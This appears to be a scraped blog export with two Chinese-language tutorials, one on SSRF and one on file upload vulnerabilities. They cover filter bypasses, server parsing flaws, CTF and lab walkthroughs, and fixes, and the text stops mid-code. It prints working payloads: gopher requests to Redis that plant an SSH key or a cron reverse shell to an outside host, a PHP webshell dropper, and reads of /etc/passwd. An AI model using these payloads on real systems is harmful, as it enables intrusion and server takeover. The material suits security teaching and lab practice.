http:&#x2F;&#x2F;www.xxx.com&#x2F;image.php?image&#x3D;http:&#x2F;&#x2F;www.xxc.com&#x2F;a.jpg 链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。 0x04-2、漏洞出现点 分享：通过url 地址分享文章，例如如下地址： http://share.xxx.com/index.php?url=http://127.0.0.1 通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。 图片加载与下载：通过URL地址加载或下载图片 http://image.xxx.com/image.php?image=http://127.0.0.1 图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。 图片、文章收藏功能 http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de 例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。 利用参数中的关键字来查找 例如以下的关键字： share wap url link src source target u 3g display sourceURl imageURL domain ... 0x04-3、漏洞绕过部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下： 1、限制为http://www.xxx.com 域名时：可以尝试采用http基本身份认证的方式绕过，http://www.xxx.com@www.xxc.com。在对@解析域名中，不同的处理函数存在处理差异，例如：http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。2、限制请求IP不为内网地址：采用短网址绕过，比如百度短地址https://dwz.cn/。采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433 3、限制请求只为http协议： 采用302跳转，百度短地址，或者使用https://tinyurl.com生成302跳转地址。使用如下： 4、其他绕过形式可以查看：https://www.secpulse.com/archives/65832.html 0x05、测试方法漏洞环境：PHP脚本、Windows 利用工具：bash、nc 首先采用如下脚本创建一个PHP的服务端 &lt;?PHP $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); ?&gt; 开启PHP的web环境，访问http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。 浏览器访问如下链接：http://localhost/ssrf.php?url=http://127.0.0.1:2233。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。 使用gopher协议来查看协议，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test 利用gopher发送POST的请求，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword 以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。 漏洞环境：Ubuntu 18、 docker 、PHP、Apache 漏洞文件地址：https://github.com/nikosdano/SSRF-Vulnerable-with-Curl 下载文件放入apache服务器中，访问http://192.168.120.132/awesome_script.php 在其中我们可以填写想要执行的SSRF命令，如填写file:///etc/passwd，回显为： 尝试端口探测，对22端口进行探测是否开启： 截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。 0x06、实战演示漏洞环境：Rootme CTF all the day 漏洞地址：https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/ 利用工具：Burp 漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的 访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。 找到一个处于none的虚拟机，点击房间名，如下的ctf04 进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。 过一段时间的等待后，会显示如下信息。 访问 ctf04.root-me.org 就可以看到启动的虚拟环境了 当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。 访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。 尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。 读取系统文件： 使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。 探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。 详细内容可以查看文章：https://www.freebuf.com/vuls/162035.html Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。 因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。 1、利用redis来写ssh密钥： 此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下： 根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。 使用的payload为： gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#x2F;Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy&#x2F;FmZmtpCf2UvZFb&#x2F;MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw&#x2F;bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a&#x2F;root&#x2F;.ssh&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a payload 解码为： gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*3 $3 set $1 1 $401 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#x2F;Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy&#x2F;FmZmtpCf2UvZFb&#x2F;MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw&#x2F;bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9 *4 $6 config $3 set $3 dir $11 &#x2F;root&#x2F;.ssh&#x2F; *4 $6 config $3 set $10 dbfilename $15 authorized_keys *1 $4 save *1 $4 quit payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。 然后尝试登陆，输入创建密钥的密码后，登陆成功。 2、利用redis写定时任务来反弹shell 既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。 使用payload为以下： gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 解码后的内容就是： gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*3 $3 set $1 1 $61 *&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;2233 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save *1 $4 quit 来自：https://joychou.org/web/phpssrf.html 其中$61为我的vps地址，也就是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。 根据前文的提示，打开/passwd文件就可以找到flag了。 在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。 0x07、CMS实战演示漏洞环境：vulhub、weblogic、ssrf 漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 下载vulhub后，进入对应的安装目录，执行docker-compose up -d,会自动创建docker镜像。 构建完成后访问如下地址： &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp 访问如下地址时返回，代表端口未开放： &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:80 &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001 响应可以看到返回404，证明端口开放： 然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。 漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。 jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer&#x2F; 在官方的漏洞通报上找到补丁安装，https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html 0x08、漏洞修复SSRF漏洞修复： 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。 对请求地址设置白名单，只允许请求白名单内的地址。 禁用除http和https外的协议，如：file://，gopher://，dict://等 限制请求的端口为固定服务端口，如：80，443 Java类代码修复，来自：joychou 方法调用： String[] urlwhitelist = &#123;\"joychou.com\", \"joychou.me\"&#125;; if (!UrlSecCheck(url, urlwhitelist)) &#123; return; &#125; 方法代码： 需要先添加guava库（目的是获取一级域名） &lt;dependency> &lt;groupId>com.google.guava&lt;/groupId> &lt;artifactId>guava&lt;/artifactId> &lt;version>21.0&lt;/version> &lt;/dependency> 方法实现： public static Boolean UrlSecCheck(String url, String[] urlwhitelist) &#123; try &#123; URL u = new URL(url); // 只允许http和https的协议 if (!u.getProtocol().startsWith(\"http\") &amp;&amp; !u.getProtocol().startsWith(\"https\")) &#123; return false; &#125; // 获取域名，并转为小写 String host = u.getHost().toLowerCase(); // 获取一级域名 String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString(); for (String whiteurl: urlwhitelist)&#123; if (rootDomain.equals(whiteurl)) &#123; return true; &#125; &#125; return false; &#125; catch (Exception e) &#123; return false; &#125; &#125;","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2019-05-30T06:11:55.000Z","updated":"2019-06-03T01:50:18.000Z","comments":true,"path":"2019/05/文件上传漏洞/","link":"","permalink":"https://misakikata.github.io/2019/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"0x01、漏洞简介​ 文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 0x02、漏洞原理​ 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 0x03、漏洞危害​ 恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。 0x04、常用绕过形式0x04-1、文件长传常见点上传头像 上传相册 上传附件 添加文章图片 前台留言资料上传 编辑器文件上传 ...... 例如如下编辑器上传点： 文件管理处文件上传： 前台用户发表文章处文件上传： 个人头像处文件上传： 0x04-2、后缀绕过PHP: php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定) ASP： asa、cer、cdx ASPX： ascx、ashx、asac JSP： jsp、jspx、jspf 0x04-3、绕过类型Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 ...... 在以下的文章介绍中，将采取其中的几种常见的绕过形式做演示。 0x05、漏洞在系统中的差异​ 上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释。 0x05-1、IIS 5.x/6.0解析漏洞1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下： 漏洞目录利用形式：www.xxx.com&#x2F;xx.asp&#x2F;xx.jpg。 xx.jpg的内容可以为一段合法的asp脚本文件。 2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp 漏洞文件利用形式：www.xxx.com&#x2F;xx.asp;.jpg xx.jpg的内容可以为一段合法的asp脚本文件。 漏洞产生的原因参考详细文章内容：https://www.cnblogs.com/l1pe1/p/9210094.html 通过对IIS6的核心文件类型解析相关文件的逆向后，整理出下面的核心处理代码。 &#x2F;&#x2F;reverse code by golds7n with ida int __thiscall Url(void *this, char *UrlStruct) &#123; void *pW3_URL_INFO; &#x2F;&#x2F; esi@1 int bSuccess; &#x2F;&#x2F; eax@1 const wchar_t *i; &#x2F;&#x2F; eax@2 wchar_t *wcsSlashTemp; &#x2F;&#x2F; ebx@6 int wcsTemp; &#x2F;&#x2F; eax@6 int wcs_Exten; &#x2F;&#x2F; eax@6 int v8; &#x2F;&#x2F; esi@9 int v10; &#x2F;&#x2F; eax@11 int v11; &#x2F;&#x2F; ST04_4@13 int v12; &#x2F;&#x2F; eax@13 int ExtenDll; &#x2F;&#x2F; eax@19 int Extenisa; &#x2F;&#x2F; eax@20 int ExtenExe; &#x2F;&#x2F; eax@21 int ExtenCgi; &#x2F;&#x2F; eax@22 int ExtenCom; &#x2F;&#x2F; eax@23 int ExtenMap; &#x2F;&#x2F; eax@24 int Entry; &#x2F;&#x2F; [sp+Ch] [bp-148h]@6 wchar_t *wcsMaohaoTemp; &#x2F;&#x2F; [sp+10h] [bp-144h]@6 unsigned int dotCount; &#x2F;&#x2F; [sp+14h] [bp-140h]@1 wchar_t *Str; &#x2F;&#x2F; [sp+18h] [bp-13Ch]@3 char *url_FileName; &#x2F;&#x2F; [sp+1Ch] [bp-138h]@1 char Url_FileExtenName; &#x2F;&#x2F; [sp+20h] [bp-134h]@1 char v25; &#x2F;&#x2F; [sp+50h] [bp-104h]@1 dotCount &#x3D; 0; pW3_URL_INFO &#x3D; this; STRU::STRU(&amp;Url_FileExtenName, &amp;v25, 0x100u); url_FileName &#x3D; (char *)pW3_URL_INFO + 228; bSuccess &#x3D; STRU::Copy((char *)pW3_URL_INFO + 228, UrlStruct); if ( bSuccess &lt; 0 ) goto SubEnd; for ( i &#x3D; (const wchar_t *)STRU::QueryStr((char *)pW3_URL_INFO + 228); ; i &#x3D; Str + 1 ) &#123; Str &#x3D; _wcschr(i, &#39;.&#39;); ***********N1************ if ( !Str ) break; ++dotCount; if ( dotCount &gt; W3_URL_INFO::sm_cMaxDots ) break; bSuccess &#x3D; STRU::Copy(&amp;Url_FileExtenName, Str); if ( bSuccess &lt; 0 ) goto SubEnd; wcsSlashTemp &#x3D; _wcschr(Str, &#39;&#x2F;&#39;); ***********N2************ JUMPOUT(wcsSlashTemp, 0, loc_5A63FD37); wcsTemp &#x3D; STRU::QueryStr(&amp;Url_FileExtenName); wcsMaohaoTemp &#x3D; _wcschr((const wchar_t *)wcsTemp, &#39;:&#39;); ***********N3************ JUMPOUT(wcsMaohaoTemp, 0, loc_5A63FD51); wcs_Exten &#x3D; STRU::QueryStr(&amp;Url_FileExtenName); __wcslwr((wchar_t *)wcs_Exten); if ( META_SCRIPT_MAP::FindEntry(&amp;Url_FileExtenName, &amp;Entry) ) &#123; *((_DWORD *)pW3_URL_INFO + 201) &#x3D; Entry; JUMPOUT(wcsSlashTemp, 0, loc_5A63FDAD); STRU::Reset((char *)pW3_URL_INFO + 404); break; &#125; if ( STRU::QueryCCH(&amp;Url_FileExtenName) &#x3D;&#x3D; 4 ) &#123; ExtenDll &#x3D; STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.dll&quot;, (const wchar_t *)ExtenDll) || (Extenisa &#x3D; STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.isa&quot;, (const wchar_t *)Extenisa)) ) JUMPOUT(loc_5A63FD89); ExtenExe &#x3D; STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.exe&quot;, (const wchar_t *)ExtenExe) || (ExtenCgi &#x3D; STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.cgi&quot;, (const wchar_t *)ExtenCgi)) || (ExtenCom &#x3D; STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.com&quot;, (const wchar_t *)ExtenCom)) ) JUMPOUT(loc_5A63FD89); ExtenMap &#x3D; STRU::QueryStr(&amp;Url_FileExtenName); JUMPOUT(_wcscmp(L&quot;.map&quot;, (const wchar_t *)ExtenMap), 0, loc_5A63FD7B); &#125; &#125; if ( *((_DWORD *)pW3_URL_INFO + 201) || (v10 &#x3D; *((_DWORD *)pW3_URL_INFO + 202), v10 &#x3D;&#x3D; 3) || v10 &#x3D;&#x3D; 2 || (v11 &#x3D; *(_DWORD *)(*((_DWORD *)pW3_URL_INFO + 204) + 0xC4C), v12 &#x3D; STRU::QueryStr(url_FileName), bSuccess &#x3D; SelectMimeMappingForFileExt(v12, v11, (char *)pW3_URL_INFO + 756, (char *)pW3_URL_INFO + 1012), bSuccess &gt;&#x3D; 0) ) v8 &#x3D; 0; else SubEnd: v8 &#x3D; bSuccess; STRU::_STRU(&amp;Url_FileExtenName); return v8; &#125; 以上有三处被标记的位置，这三处是用来检测点号、反斜杠、分号。、 可以理解为的检测流程为： www.xxx.com&#x2F;xxx.asp;xxx.jpg N1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot; N2:查找&quot;;&quot;号,如果有则内存截断 N3:查找&quot;&#x2F;&quot;,如果有则内存截断 因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。 对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。 0x05-2、Nginx 解析漏洞​ Nginx是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点开发的。 ​ 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。 ​ 普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”www.xx.com/phpinfo.jpg/1.php” 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 ​ 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; 然后访问xx.jpg/.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，如下即可触发： 0x05-3、Apache 解析漏洞​ Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl/Python等解释器编译到服务器中。 ​ Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式： www.xxxx.com&#x2F;apache.php.bbb.aaa Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件。 ​ 那么为什么会产生此问题原因，在Apache的官方网站上，有一句这么关于“extension”的解释： 地址：http:&#x2F;&#x2F;httpd.apache.org&#x2F;docs&#x2F;current&#x2F;mod&#x2F;directive-dict.html extension In general, this is the part of the filename which follows the last dot. However, Apache recognizes multiple filename extensions, so if a filename contains more than one dot, each dot-separated part of the filename following the first dot is an extension. For example, the filename file.html.en contains two extensions: .html and .en. For Apache directives, you may specify extensions with or without the leading dot. In addition, extensions are not case sensitive. ​ 通过这个解释可以看出来，Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。 ​ 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。 ​ 此处使用phpstudy测试，利用dvwa的文件上传功能，上传1.php.wwe。结果解析如下： 0x06、测试方法对于文件上传漏洞方式和举例此处采用一个文件靶场，地址：https://github.com/c0ny1/upload-labs 以下将利用靶场其中的一部分内容来举例说明文件上传漏洞的产生和效果。 环境：Ubuntu 18、Windows phpStudy (采用不一样的系统，为了在不同系统的差异做演示) WEB容器：Apache 2.0 语言：PHP 抓包工具：Burp Suite Pro 验证工具：Hackbar插件 0x06-1、前端验证此种验证形式在很多网站、CMS都有使用，只在前端利用JS来做效验，采用禁用JS上传、抓包上传都可以绕过此处限制。此处采用抓包演示。 点击上传文件，选择已经改成“.jpg”后缀的后门文件。修改burp中的文件后缀信息。 访问已经上传的文件，利用Hackbar访问phpinfo()。可以看到后门已经得到执行。 0x06-2、.htaccess规则文件绕过​ 在利用.htaccess文件之前，我们先来了解一下什么是.htaccess规则文件。.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。 ​ 概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 ​ 在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。 ​ 先上传一个.htaccess文件，内容为：AddType application/x-httpd-php .aaa。如下： ​ 然后再上传文件后缀为.aaa的文件，让其解析为php类型文件。 ​ 上传成功后访问此上传文件，访问如下： 0x06-3、文件名后缀大小写混合绕过​ 在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。如下形式： ​ 访问上传成功的文件： 0x06-4、Windows文件流特性绕过​ 在讨论这种特性之前，我们先来认识一下Windows文件流。流文件，即NTFS交换数据流（alternate data streams，简称ADS），是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，它使用资源派生来维持与文件相关的信息。创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。 ​ 详细相关介绍和内容可以查看文章：https://www.freebuf.com/column/143101.html。此处不做深入解释。 上传文件为xxx.php::$DATA类型的文件。可以看到上传的文件为xxx.php::$data。 我们访问的时候就可以直接访问xxx.php文件。 0x06-5、%00截断绕过​ 以上问题被绕过的根本原因是采用了一些有缺陷的黑名单限制，一般采用白名单的限制会减少相当多的绕过问题产生，但是并不意味着一定安全，在某些没有处理严格的程序上，仍然可以采用截断绕过的形式。 首先我们来看这段上传的代码： $is_upload &#x3D; false; $msg &#x3D; null; if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &quot;上传失败&quot;; &#125; &#125; else &#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。如下上传，显示文件路径中有个空格，这并不是真正意义上的空格，而是%00截断后显示成的空格。 访问上传地址路径： 0x06-5、文件头检测绕过​ 提到文件头检测，我们就先来认识一下常见文件的文件头格式。我们先打开一个正常的JPG图片格式文件，查看文件的文件头十六进制。采用010Editor。 ​ 右边栏中有明显的JFIF存储格式字样，文件头前十个字节为FF D8 FF E0 00 10 4A 46 49 46，其中开头标红的为标记码，FF D8代表SOI标记，意思是图像文件开始值。4A 46 49 46代表字符串JFIF标记。 关于JPEG文件格式介绍可以阅读：https://www.cnblogs.com/sddai/p/5666924.html ​ 然后我们再打开一份PNG文件格式的图片，同样采用010Editor来查看其十六进制。 ​ 对于的开头4字节为右栏中‰PNG字样，PNG的8字节文件署名域用来识别该文件是不是PNG文件。也就是89 50 4E 47 0D 0A 1A 0A。 关于PNG文件格式可以阅读：https://blog.csdn.net/qq_21950929/article/details/79198814 ​ 同样打开一份GIF文件格式图片，用010Editor来打开查看文件。 ​ 文件十六进制中可以看到，其中47 49 46 38 39 61，代表了右栏中的GIF89a，这六个字节作为了GIF文件格式头的开头文件。而在其后的绕过中就采用了GIF89a这个字符串。 关于GIF文件格式可以阅读：https://www.jianshu.com/p/df52f1511cf8 了解过文件格式后，我们来看这个文件格式检测绕过形式，首先查看代码，为了方便演示修改了源代码对文件格式的获取，此处只读取文件的前两个字节值： function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节 fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType; &#125; $is_upload &#x3D; false; $msg &#x3D; null; if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type &#x3D; getReailFileType($temp_file); if($file_type 